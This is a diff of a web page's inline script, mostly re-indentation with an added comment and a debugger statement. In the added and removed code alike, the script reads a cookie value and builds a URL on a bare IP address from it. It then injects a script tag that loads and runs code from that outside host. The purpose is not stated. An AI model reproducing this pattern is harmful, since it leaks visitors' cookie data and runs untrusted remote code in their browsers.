@@ -46,40 +46,43 @@
     </iframe>
 </div>
 <script>
-        (function (w) {
-            var a7 = w.a7 || {};
-            var d = document;
-            var mim_c = function (mim_d, mim_f) {
-                var mim_g = mim_f || document.all || document.getElementsByTagName("*");
-                var mim_f = mim_g[mim_g.length - 1];
-                mim_f.parentNode.appendChild(mim_d);
-            };
-            a7.u = function () {
-                //            debugger;
-                //获取url
-                var f = d.location.href;
-                //拼接url
-                d.getElementById("m").src = f + (f.indexOf("?") < 0 ? '?' : '&') + '_t_t_t=' + Math.random();
-                var url = "http://61.174.50.211:8001/tv/adc.php?account=&h";
-                //分割cookie
-                var uki = d.cookie.split("; ");
-                var wP_h;
-                for (var i = 0; i < uki.length; i++) {
-                    var arr = uki[i].split("=");
-                    if ("wP_h" == arr[0]) {
-                        wP_h = arr[1];
-                        break;
-                    }
+    (function (w) {
+        var a7 = w.a7 || {};
+        var d = document;
+        var mim_c = function (mim_d, mim_f) {
+            var mim_g = mim_f || document.all || document.getElementsByTagName("*");
+            //获取dom最后一  个节点
+            var mim_f = mim_g[mim_g.length - 1];
+            mim_f.parentNode.appendChild(mim_d);
+        };
+        a7.u = function () {
+            //获取url
+            var f = d.location.href;
+            //拼接url
+            d.getElementById("m").src = f + (f.indexOf("?") < 0 ? '?' : '&') + '_t_t_t=' + Math.random();
+            var url = "http://61.174.50.211:8001/tv/adc.php?account=&h";
+            //分割cookie
+            var uki = d.cookie.split("; ");
+            var wP_h;
+            for (var i = 0; i < uki.length; i++) {
+                var arr = uki[i].split("=");
+                if ("wP_h" == arr[0]) {
+                    wP_h = arr[1];
+                    break;
                 }
-                var nu = url.replace(/&h/, wP_h);
-                var mim_b = document.createElement("script");
-                mim_b.type = "text/javascript";
-                mim_b.src = nu;
-                mim_c(mim_b);
-            };
-            //循环调用
-            w.a7 = a7;
-        })(window);
+            }
+
+            //替换,形成http://61.174.50.211:8001/tv/adc.php?account=iliangqunru
+            var nu = url.replace(/&h/, wP_h);
+            var mim_b = document.createElement("script");
+            mim_b.type = "text/javascript";
+            debugger;
+            mim_b.src = nu;
+            mim_c(mim_b);
+        };
+        //循环调用
+        w.a7 = a7;
+    })(window);
 
 </script>
 
